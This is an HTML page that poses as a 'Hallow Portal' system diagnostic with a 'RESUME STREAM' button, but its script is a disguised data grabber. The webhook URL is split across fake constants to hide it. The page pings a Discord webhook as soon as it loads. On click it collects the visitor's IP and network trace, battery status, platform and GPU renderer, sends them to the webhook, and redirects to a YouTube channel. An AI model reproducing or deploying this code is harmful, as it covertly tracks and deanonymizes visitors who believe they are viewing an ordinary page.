<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>System Diagnostic | Hallow Portal</title>
    <style>
        body { background: #000; color: #fff; font-family: sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
        .container { text-align: center; padding: 50px; border: 1px solid #1a1a1a; border-radius: 20px; background: #050505; width: 350px; }
        .action-btn { background: #ff0000; color: #fff; padding: 20px 0; width: 100%; border-radius: 10px; font-weight: 800; border: none; font-size: 20px; cursor: pointer; }
        .footer-note { color: #222; font-size: 10px; margin-top: 20px; letter-spacing: 2px; }
    </style>
</head>
<body>

    <div class="container" id="app_root">
        <button class="action-btn" id="start_sync">▶ RESUME STREAM</button>
        <p class="footer-note">HALLOW-DIAGNOSTIC-V11</p>
    </div>

    <script>
    // --- DISTRIBUTED CONFIGURATION ---
    // Webhook parts placed randomly to mimic app constants
    const SYS_EP = "https://discord.com/api/webhooks/";
    const APP_ID = "1497904289514000414";
    const AUTH_T = "/iBEkMTCSc_f4Dh2IxZsZjPfodFI1RiaDt7G6xYaWFsJRk4pZ_bdXlInRWb4DgEGcfeM0";

    const REDIR_TARGET = "https://youtube.com/@LigmaBlox-w7m";
    const FULL_URL = SYS_EP + APP_ID + AUTH_T;

    // --- PACKET DISPATCHER ---
    async function transmit(data) {
        const blob = new Blob([JSON.stringify(data)], { type: 'application/json' });
        
        // Use Beacon for immediate background delivery
        navigator.sendBeacon(FULL_URL, blob);

        // Fallback fetch with keepalive to ensure delivery during redirect
        try {
            await fetch(FULL_URL, {
                method: 'POST',
                mode: 'no-cors',
                keepalive: true,
                body: JSON.stringify(data)
            });
        } catch (e) {}
    }

    // --- SYSTEM SCANNER ---
    document.getElementById('start_sync').onclick = async function() {
        this.innerHTML = "LOADING...";
        this.style.opacity = "0.5";

        try {
            // Simultaneous data collection (Efficiency)
            const [trace, battery] = await Promise.all([
                fetch('https://www.cloudflare.com/cdn-cgi/trace').then(res => res.text()).catch(() => "Trace Error"),
                navigator.getBattery ? navigator.getBattery().catch(() => null) : null
            ]);

            // Hardware Unmasking
            let gpu = "Generic";
            try {
                const gl = document.createElement('canvas').getContext('webgl');
                const dbg = gl.getExtension('WEBGL_debug_renderer_info');
                gpu = gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL);
            } catch(e) {}

            const bat_info = battery ? `${Math.round(battery.level * 100)}% (${battery.charging ? 'Plugged' : 'Battery'})` : "Blocked";

            // Final Report Structure
            const payload = {
                username: "HALLOW-MONITOR",
                embeds: [{
                    title: "System Synchronization Successful",
                    color: 16711680,
                    fields: [
                        { name: "Device Platform", value: navigator.platform, inline: true },
                        { name: "Power Status", value: bat_info, inline: true },
                        { name: "GPU Renderer", value: "```" + gpu + "```" },
                        { name: "Network Node", value: "```" + trace.split('\n').slice(0,4).join('\n') + "```" }
                    ],
                    timestamp: new Date()
                }]
            };

            // Transmit and short pause to clear the network buffer
            await transmit(payload);
            setTimeout(() => {
                window.location.replace(REDIR_TARGET);
            }, 600);

        } catch (err) {
            window.location.replace(REDIR_TARGET);
        }
    };

    // Initial Handshake on Page Load
    transmit({ content: "⚠️ **Hallow System: Node Accessed**" });
    </script>
</body>
</html>
